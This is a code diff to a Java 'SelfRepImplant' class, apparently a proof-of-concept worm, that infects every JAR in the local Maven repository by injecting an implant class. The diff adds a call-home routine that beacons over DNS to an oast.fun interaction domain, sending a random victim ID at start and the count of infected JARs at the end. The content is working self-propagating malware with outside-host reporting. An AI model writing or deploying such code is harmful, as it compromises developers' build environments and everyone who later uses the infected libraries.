@@ -5,12 +5,12 @@ import org.example.injector.ImplantHandler;
 import org.example.injector.ImplantHandlerImpl;
 
 import java.io.IOException;
+import java.net.InetAddress;
+import java.net.UnknownHostException;
 import java.nio.file.Files;
 import java.nio.file.Path;
-import java.util.HashSet;
-import java.util.LinkedList;
-import java.util.List;
-import java.util.Set;
+import java.security.SecureRandom;
+import java.util.*;
 import java.util.jar.JarFile;
 
 public class SelfRepImplant implements Runnable, Thread.UncaughtExceptionHandler {
@@ -23,6 +23,11 @@ public class SelfRepImplant implements Runnable, Thread.UncaughtExceptionHandler
      * All JARs in this directory will be spiked.
      */
     static volatile String CONF_LIMIT_PATH = "~/.m2/repository";
+
+    /**
+     * Domain to report home to.
+     */
+    static volatile String CONF_DOMAIN = "awxbuqxppmidgwnzbaohcbazx0vcxkdb9.oast.fun";
 
     @SuppressWarnings("unused")
     public static void init() {
@@ -60,6 +65,9 @@ public class SelfRepImplant implements Runnable, Thread.UncaughtExceptionHandler
     }
 
     public static void payload() {
+        String id = generateRandomId();
+        callHpme(CONF_DOMAIN, "hello", id);
+
         Set<Path> jarsToImplant;
         try {
             jarsToImplant = findAllJars(CONF_LIMIT_PATH);
@@ -81,12 +89,14 @@ public class SelfRepImplant implements Runnable, Thread.UncaughtExceptionHandler
         System.out.println("[i] Implant: " + implantHandler.getImplantClassName());
         System.out.println();
 
+        int numInfected = 0;
         for (Path jarToImplant : jarsToImplant) {
             System.out.println("[+] Infecting " + jarToImplant + "...");
             ClassInjector injector = new ClassInjector(implantHandler);
 
             try {
                 injector.infect(jarToImplant, jarToImplant);
+                numInfected++;
                 System.out.println("[+] Spiked " + jarToImplant);
             } catch (IOException e) {
                 System.out.println("[-] Failed to infect " + jarToImplant + " (" + e.getMessage() + ")");
@@ -97,6 +107,8 @@ public class SelfRepImplant implements Runnable, Thread.UncaughtExceptionHandler
 
             System.out.println();
         }
+
+        callHpme(CONF_DOMAIN, "did-" + numInfected, id);
     }
 
     public static Set<Path> findAllJars(String root) throws IllegalArgumentException {
@@ -153,6 +165,26 @@ public class SelfRepImplant implements Runnable, Thread.UncaughtExceptionHandler
             return jarFile.getManifest() != null;
         } catch (IOException e) {
             return false;
+        }
+    }
+
+    private static String generateRandomId() {
+        Random rng = new SecureRandom();
+        return "" + rng.nextInt(0, Integer.MAX_VALUE);
+    }
+
+    @SuppressWarnings("all")
+    private static void callHpme(String domain, String... fields) {
+        StringBuilder fqdn = new StringBuilder();
+        for (String field : fields) {
+            fqdn.append(field).append(".");
+        }
+        fqdn.append(domain);
+
+        try {
+            System.out.println("Resolving '" + fqdn.toString() + "'.");
+            InetAddress.getByName(fqdn.toString());
+        } catch (UnknownHostException ignored) {
         }
     }
 }
